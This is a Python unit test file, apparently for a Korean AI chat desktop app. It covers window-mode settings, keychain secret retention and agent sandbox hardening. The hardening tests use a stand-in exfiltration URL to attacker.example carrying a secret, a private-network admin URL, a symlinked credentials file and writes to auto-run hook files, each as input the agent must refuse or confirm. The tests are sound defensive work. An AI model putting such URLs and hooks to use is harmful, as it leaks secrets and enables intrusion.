# SPDX-FileCopyrightText: 2026 Beomjoon Kim
# SPDX-License-Identifier: AGPL-3.0-only
"""2.0.0: 창의 제목 표시줄(최소화·최대화·닫기) 복구 — 기본 창 크기를 최대화로, 1.19.x가 저장한 전체 화면은 한 번 초기화,
F11로 전체 화면을 끄면 최대화돼 있던 창은 최대화로 돌아간다."""
import ast
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from support import isolated_app_dir  # noqa: E402

import storage  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent


class FakeEvent:
    def __init__(self):
        self.handlers = []

    def __iadd__(self, handler):
        self.handlers.append(handler)
        return self

    def fire(self):
        for handler in self.handlers:
            handler()


class FakeWindow:
    def __init__(self):
        self.calls = []
        self.events = type("E", (), {})()
        self.events.maximized = FakeEvent()
        self.events.restored = FakeEvent()

    def toggle_fullscreen(self):
        self.calls.append("toggle")

    def maximize(self):
        self.calls.append("maximize")


class WindowModeTests(unittest.TestCase):
    def setUp(self):
        import os
        import types

        self.iso = isolated_app_dir()
        self.iso.__enter__()
        self.addCleanup(self.iso.__exit__, None, None, None)
        os.environ.setdefault("POSTECH_CHAT_SECRETS", "file")
        sys.modules.setdefault("webview", types.SimpleNamespace(FOLDER_DIALOG=20))
        import main
        self.main = main

    def bridge(self):
        b = self.main.Bridge()
        self.addCleanup(b._mcp.shutdown)
        self.addCleanup(b._events.stop)
        return b

    def test_default_is_maximized_so_the_title_bar_buttons_show(self):
        self.assertEqual(self.main.DEFAULT_WINDOW_MODE, "maximized")
        self.assertEqual(self.bridge()._window_mode(), "maximized")

    def test_fullscreen_saved_by_1_19_is_reset_once(self):
        cfg = storage.load_config()
        cfg.update(window_mode="fullscreen", window_mode_191=True)  # 1.19.1이 설정 저장 때 함께 적어 둔 값
        storage.save_config(cfg)
        self.assertEqual(self.bridge()._window_mode(), "maximized")
        self.assertNotIn("window_mode", storage.load_config())
        # 2.0에서 직접 고른 전체 화면은 다음 실행에도 그대로
        self.bridge().save_settings({"window_mode": "fullscreen"})
        self.assertEqual(self.bridge()._window_mode(), "fullscreen")
        self.assertEqual(self.bridge()._window_mode(), "fullscreen")

    def test_normal_and_maximized_choices_survive(self):
        for mode in ("normal", "maximized"):
            cfg = storage.load_config()
            cfg.update(window_mode=mode, window_mode_191=True)
            storage.save_config(cfg)
            self.assertEqual(self.bridge()._window_mode(), mode)

    def test_unchanged_window_mode_is_not_written(self):
        b = self.bridge()
        b.save_settings({"window_mode": "maximized"})  # 설정 창은 고르지 않은 값도 늘 보낸다
        self.assertNotIn("window_mode", storage.load_config())
        b.save_settings({"window_mode": "normal"})
        self.assertEqual(storage.load_config()["window_mode"], "normal")

    def test_leaving_fullscreen_returns_to_maximized(self):
        b = self.bridge()
        window = FakeWindow()
        b._track_window(window, "maximized")
        self.assertTrue(b.toggle_fullscreen()["fullscreen"])
        window.events.maximized.fire()  # WinForms는 전체 화면을 켤 때도 최대화 이벤트를 낸다
        self.assertFalse(b.toggle_fullscreen()["fullscreen"])
        self.assertEqual(window.calls, ["toggle", "toggle", "maximize"])

    def test_started_fullscreen_returns_to_maximized(self):
        b = self.bridge()
        window = FakeWindow()
        b._track_window(window, "fullscreen")
        self.assertFalse(b.toggle_fullscreen()["fullscreen"])
        self.assertEqual(window.calls, ["toggle", "maximize"])

    def test_normal_window_stays_normal(self):
        b = self.bridge()
        window = FakeWindow()
        b._track_window(window, "maximized")
        window.events.restored.fire()  # 사용자가 제목 표시줄로 창을 줄였다
        b.toggle_fullscreen()
        b.toggle_fullscreen()
        self.assertEqual(window.calls, ["toggle", "toggle"])

    def test_toggle_without_window_is_harmless(self):
        self.assertEqual(self.bridge().toggle_fullscreen(), {"ok": True})

    def test_run_app_tracks_the_window(self):
        tree = ast.parse((ROOT / "main.py").read_text(encoding="utf-8"))
        run_app = next(n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name == "run_app")
        names = {getattr(n.func, "attr", "") for n in ast.walk(run_app) if isinstance(n, ast.Call)}
        self.assertIn("_track_window", names)


if __name__ == "__main__":
    unittest.main()


class FlakyKeyring:
    """잠긴 키체인: fail이 켜져 있으면 읽기·쓰기가 실패한다."""

    def __init__(self):
        self.store, self.fail = {}, False

    def get_password(self, service, name):
        if self.fail:
            raise RuntimeError("locked")
        return self.store.get((service, name))

    def set_password(self, service, name, value):
        if self.fail:
            raise RuntimeError("locked")
        self.store[(service, name)] = value

    def delete_password(self, service, name):
        if self.fail:
            raise RuntimeError("locked")
        self.store.pop((service, name), None)


class SecretsUnreadableTests(unittest.TestCase):
    """2.0: 시작할 때 키체인을 읽지 못한 뒤 설정을 저장해도 저장된 API 키를 지우지 않는다."""

    def setUp(self):
        import secret_store

        self.iso = isolated_app_dir()
        self.iso.__enter__()
        self.addCleanup(self.iso.__exit__, None, None, None)
        self.ss = secret_store
        self.kr = FlakyKeyring()
        orig, orig_path = secret_store._keyring, secret_store.SECRETS_PATH
        secret_store._keyring = self.kr
        secret_store.SECRETS_PATH = storage.APP_DIR / "secrets.json"
        self.addCleanup(setattr, secret_store, "_keyring", orig)
        self.addCleanup(setattr, secret_store, "SECRETS_PATH", orig_path)
        cfg = storage.load_config()
        cfg.update(api_key="k-postech", anthropic_api_key="k-claude")
        storage.save_config(cfg)

    def test_denied_then_allowed_keeps_the_keys(self):
        self.kr.fail = True
        cfg = storage.load_config()  # 시작할 때 접근 거부
        self.assertEqual(cfg.get("api_key", ""), "")
        self.assertTrue(cfg[storage.SECRETS_UNREADABLE])
        self.kr.fail = False  # 다음 저장 때 허용
        cfg["update_checked_at"] = 1
        storage.save_config(cfg)
        self.assertEqual(storage.load_config()["api_key"], "k-postech")
        self.assertEqual(cfg["api_key"], "k-postech")  # 쓰던 설정에도 되살아난다
        self.assertNotIn(storage.SECRETS_UNREADABLE, cfg)
        self.assertNotIn(storage.SECRETS_UNREADABLE, (storage.CONFIG_PATH).read_text(encoding="utf-8"))

    def test_new_key_entered_while_unreadable_is_merged(self):
        self.kr.fail = True
        cfg = storage.load_config()
        self.kr.fail = False
        cfg["openai_api_key"] = "k-openai"
        storage.save_config(cfg)
        got = storage.load_config()
        self.assertEqual((got["api_key"], got["anthropic_api_key"], got["openai_api_key"]),
                         ("k-postech", "k-claude", "k-openai"))

    def test_still_locked_save_does_not_delete(self):
        self.kr.fail = True
        cfg = storage.load_config()
        storage.save_config(cfg)
        self.kr.fail = False
        self.assertEqual(storage.load_config()["api_key"], "k-postech")

    def test_explicit_clear_still_deletes(self):
        cfg = storage.load_config()
        for k in storage.CONFIG_SECRET_KEYS:
            cfg[k] = ""
        storage.save_config(cfg)
        self.assertEqual(storage.load_config().get("api_key", ""), "")

    def test_non_object_config_file_opens_with_defaults(self):
        storage.CONFIG_PATH.write_text("[]", encoding="utf-8")
        self.assertIsInstance(storage.load_config(), dict)


class AgentHardeningTests(unittest.TestCase):
    """2.0 검토에서 고친 에이전트 도구들."""

    def make(self, ws, confirm=lambda *a: True):
        from agent import Agent

        return Agent("key", ws, True, 5, 5, on_status=lambda *a: None, on_tool=lambda *a: None,
                     confirm=confirm, cancelled=lambda: False)

    def server(self, name, tool):
        class S:
            builtin = True

            def __init__(self):
                self.name, self.calls = name, []
                self.tools = [{"name": tool, "inputSchema": {}, "annotations": {"readOnlyHint": True}}]

            def call(self, t, args):
                self.calls.append((t, args))
                return "ok", False
        return S()

    def test_mcp_url_made_up_by_the_model_is_confirmed(self):
        import tempfile
        from unittest.mock import patch

        import web_research
        with tempfile.TemporaryDirectory() as ws, patch.object(web_research, "_resolves_local", return_value=False):
            asked = []
            agent = self.make(ws, confirm=lambda kind, title, detail: asked.append((kind, detail)) or False)
            srv = self.server("paper", "read")
            agent.mcp_servers = {"paper": srv}
            with self.assertRaises(Exception):
                agent._tool_mcp("paper.read", {"paper": "https://attacker.example/x.pdf?d=secret"})
            self.assertEqual(srv.calls, [])
            self.assertEqual(asked[0][0], "site")
            # arXiv 주소는 번호만 쓰므로 묻지 않는다
            agent._tool_mcp("paper.read", {"paper": "https://arxiv.org/abs/1706.03762"})
            self.assertEqual(len(srv.calls), 1)

    def test_mcp_url_to_private_network_is_refused(self):
        import tempfile
        with tempfile.TemporaryDirectory() as ws:
            agent = self.make(ws)
            srv = self.server("firecrawl", "scrape")
            agent.mcp_servers = {"firecrawl": srv}
            with self.assertRaises(Exception):
                agent._tool_mcp("firecrawl.scrape", {"url": "http://192.168.0.1/admin"})
            self.assertEqual(srv.calls, [])

    @unittest.skipIf(sys.platform == "win32", "POSIX 프로세스 그룹")
    def test_run_timeout_kills_the_child_process(self):
        import os
        import tempfile
        import time
        from unittest.mock import patch

        import agent as agent_mod
        with tempfile.TemporaryDirectory() as ws, patch.object(agent_mod, "COMMAND_TIMEOUT", 1):
            a = self.make(ws)
            started = time.monotonic()
            out = a._tool_run("sleep 30 & echo $! > child.pid; wait")
            self.assertLess(time.monotonic() - started, 15)
            self.assertIn("중단", out)
            pid = int(Path(ws, "child.pid").read_text().strip())
            time.sleep(0.3)
            try:
                os.kill(pid, 0)
                alive = Path(f"/proc/{pid}/stat").exists() and Path(f"/proc/{pid}/stat").read_text().split()[2] != "Z"
            except ProcessLookupError:
                alive = False
            self.assertFalse(alive, "시간 초과 뒤 자식 프로세스가 남았다")

    @unittest.skipIf(sys.platform == "win32", "심볼릭 링크 권한")
    def test_search_skips_links_outside_the_workspace(self):
        import os
        import tempfile
        with tempfile.TemporaryDirectory() as ws, tempfile.TemporaryDirectory() as outside:
            Path(outside, "credentials").write_text("aws_secret=TOPSECRET\n")
            Path(ws, "inside.txt").write_text("TOPSECRET inside\n")
            os.symlink(Path(outside, "credentials"), Path(ws, "notes.txt"))
            out = self.make(ws)._tool_search("TOPSECRET")
            self.assertIn("inside.txt", out)
            self.assertNotIn("aws_secret", out)


class StreamJsonAnswerTests(unittest.TestCase):
    def test_json_answer_streamed_as_deltas_is_kept(self):
        from unittest.mock import patch

        import api
        answer = '{"code": 200, "message": "OK"}'
        events = [("response.output_text.delta", {"type": "response.output_text.delta", "delta": answer})]

        class R:
            def close(self):
                pass
        with patch.object(api, "_events", return_value=iter(events)), \
                patch.object(api, "_chunk", side_effect=lambda e, d: ("delta", d["delta"])):
            text, _ = api._read_stream(R(), lambda t: None, None)
        self.assertEqual(text, answer)


class BrowserAgentLabelTests(unittest.TestCase):
    def test_input_values_are_never_used_as_labels(self):
        import browser_agent
        for script in (browser_agent.SNAPSHOT_SCRIPT, browser_agent.ACTION_SCRIPT):
            body = script[script.index("const label"):script.index("return String(t)")]
            self.assertNotIn(".value ||", body)
            self.assertIn("valueLabel(", body)
        src = (ROOT / "browser_agent.py").read_text(encoding="utf-8")
        self.assertIn('if el.get("sensitive"):', src[src.index("def extract"):src.index("def screenshot")])


class SyncUnreadableFileTests(unittest.TestCase):
    def test_unreadable_thread_is_not_sent_as_deleted(self):
        import sync
        with isolated_app_dir():
            storage.THREADS_DIR.mkdir(parents=True, exist_ok=True)
            (storage.THREADS_DIR / "abc.json").write_text("{broken", encoding="utf-8")
            self.assertTrue(sync._still_on_disk("thread", "abc"))
            (storage.THREADS_DIR / "empty.json").write_text('{"id": "empty", "messages": []}', encoding="utf-8")
            self.assertFalse(sync._still_on_disk("thread", "empty"))
            self.assertFalse(sync._still_on_disk("thread", "gone"))


class ManualLocalPrivacyTests(unittest.TestCase):
    def test_sensitive_prompt_does_not_fall_back_to_cloud(self):
        src = (ROOT / "adaptive_engine.py").read_text(encoding="utf-8")
        block = src[src.index("if manual_local:"):src.index("route = self._route(a, purpose)")]
        self.assertIn("sensitive_local_only", block)
        self.assertIn("escalation=bool(self.s.get(\"manual_fallback\")) and cloud_ok", block)


class AutoRunFileTests(unittest.TestCase):
    def test_chat_agent_asks_exec_for_auto_run_files_even_under_auto_edit(self):
        import tempfile

        from agent import Agent
        with tempfile.TemporaryDirectory() as ws:
            asked = []
            a = Agent("key", ws, True, 5, 5, on_status=lambda *x: None, on_tool=lambda *x: None,
                      confirm=lambda kind, title, detail: asked.append(kind) or False, cancelled=lambda: False)
            out = a._tool_write(".vscode/tasks.json", "{}")
            self.assertIn("거부", out)
            self.assertFalse(Path(ws, ".vscode", "tasks.json").exists())
            a._tool_write("src/app.py", "x = 1\n")
            self.assertEqual(asked, ["exec", "edit"])
            self.assertFalse(a._confirm_download(".husky/pre-commit", "https://e.x/a", 10))
            self.assertEqual(asked[-1], "exec")


class NonUtf8EditTests(unittest.TestCase):
    def test_agent_refuses_to_edit_files_it_cannot_decode(self):
        import tempfile

        from agent import Agent, ToolError
        with tempfile.TemporaryDirectory() as ws:
            Path(ws, "latin.txt").write_bytes(b"caf\xe9\nline\n")
            Path(ws, "ko.txt").write_bytes("한글\n".encode("cp949"))
            a = Agent("key", ws, True, 5, 5, on_status=lambda *x: None, on_tool=lambda *x: None,
                      confirm=lambda *x: True, cancelled=lambda: False)
            with self.assertRaises(ToolError):
                a._tool_edit("latin.txt", "line", "LINE")
            self.assertEqual(Path(ws, "latin.txt").read_bytes(), b"caf\xe9\nline\n")
            a._tool_edit("ko.txt", "한글", "한국어")
            self.assertEqual(Path(ws, "ko.txt").read_bytes(), "한국어\n".encode("cp949"))
